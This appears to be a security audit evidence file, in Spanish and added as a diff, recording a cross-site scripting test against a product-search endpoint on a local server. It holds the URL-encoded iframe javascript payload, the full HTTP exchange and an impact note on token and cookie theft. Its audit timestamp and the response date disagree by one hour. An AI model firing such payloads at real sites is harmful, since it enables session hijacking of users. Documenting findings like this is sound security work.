@@ -1,0 +1,29 @@
+================================================================================
+EVIDENCIA TÉCNICA 2: CROSS-SITE SCRIPTING (OWASP A03:2021 / API8:2023)
+Target: /rest/products/search?q=
+Fecha de Auditoría: 2026-10-28 18:21:54 UTC
+================================================================================
+
+--- HTTP REQUEST ---
+GET /rest/products/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60INSEGUS_XSS_AUDIT_ST02%60%29%22%3E HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) OWASP_ZAP_Traceability
+
+--- HTTP RESPONSE (Status: 200 OK) ---
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 30
+ETag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+Vary: Accept-Encoding
+Date: Wed, 28 Oct 2026 17:21:54 GMT
+Connection: close
+
+Body: {"status":"success","data":[]}
+
+ANÁLISIS DE IMPACTO:
+El payload se refleja en el cliente Angular sin saneamiento de contexto en el componente search-result,
+permitiendo la ejecución de JavaScript en el origen del usuario con robo de JWT tokens y cookies de sesión.
